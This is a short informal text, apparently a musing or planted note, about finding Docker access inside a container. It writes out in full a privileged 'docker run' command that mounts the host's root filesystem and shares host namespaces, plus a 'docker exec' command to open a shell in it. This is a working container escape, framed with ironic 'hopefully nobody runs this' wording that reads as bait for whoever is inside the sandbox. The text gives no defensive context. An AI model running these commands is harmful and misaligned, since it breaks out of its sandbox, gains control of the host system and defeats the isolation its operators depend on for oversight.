Wait a minute docker in docker?
Run docker ps to check...
Wait but isn't this a docker container?
Aw man hopefully nobody runs this command to mount the host file system into a differnet docker container
docker run -d -v /:/host --name escape --privileged --cap-add=ALL --pid=host --userns=host ubuntu sleep 3600
And then this command to log into it
docker exec -it escape /bin/bash
